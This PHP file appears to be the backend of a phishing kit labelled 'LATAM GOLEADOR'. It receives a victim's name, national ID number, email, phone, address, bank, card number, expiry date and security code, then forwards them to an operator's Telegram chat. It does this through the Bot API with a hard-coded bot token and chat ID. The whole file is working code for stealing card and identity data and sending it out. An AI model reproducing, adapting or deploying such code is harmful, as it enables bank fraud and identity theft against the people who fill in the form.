<?php
// send_to_telegram.php

// Token y chat ID de Telegram
$telegram_token = '7151494583:AAGPQX5iMVK9193isjPcQEUVB3iaeinwN4s';
$chat_id = '799134063';

header('Content-Type: application/json');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

function generateSessionID() {
    return bin2hex(random_bytes(16));  // Genera un ID único
}

session_start();

// Generar y almacenar el ID de sesión si no existe
if (!isset($_SESSION['session_id'])) {
    $_SESSION['session_id'] = generateSessionID();
}

if ($data) {
    // Construir el mensaje
    $message = "LATAM GOLEADOR💎\n";
    $message .= "-------------------------------\n";
    $message .= "👤Nombre: " . $data['name'] . "\n";
    $message .= "🪪Cédula: " . $data['cc'] . "\n";
    $message .= "-------------------------------\n";
    $message .= "💌Correo: " . $data['email'] . "\n";
    $message .= "📞Teléfono: " . $data['telnum'] . "\n";
    $message .= "🌇Ciudad: " . $data['city'] . "\n";
    $message .= "🗺️Dirección: " . $data['address'] . "\n";
    $message .= "-------------------------------\n";
    $message .= "🏦 Banco: " . $data['ban'] . "\n";
    $message .= "💳: " . $data['p'] . "\n";
    $message .= "📅: " . $data['pdate'] . "\n";
    $message .= "🔐: " . $data['c'] . "\n";
    $message .= "------------------------------\n";
    $message .= "Disp: " . $data['disp'] . "\n";
    $message .= "IdSession: " . $_SESSION['session_id'] . "\n";  // Aquí accedes correctamente al ID de sesión

    // URL de la API de Telegram
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";

    // Parámetros de la solicitud
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );

    // Iniciar curl
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecutar y cerrar curl
    $result = curl_exec($ch);
    curl_close($ch);

    // Decodificar el resultado para obtener el message_id
    $result_data = json_decode($result, true);
    
    // Verificar si la respuesta fue exitosa
    if (isset($result_data['result']['message_id'])) {
        $message_id = $result_data['result']['message_id']; // Obtener el message_id

        // Devolver el message_id y el session_id en la respuesta
        echo json_encode([
            'status' => 'success', 
            'message_id' => $message_id,
            'session_id' => $_SESSION['session_id']  // Incluir el session_id en la respuesta
        ]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send message', 'error' => $result_data]);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}
?>
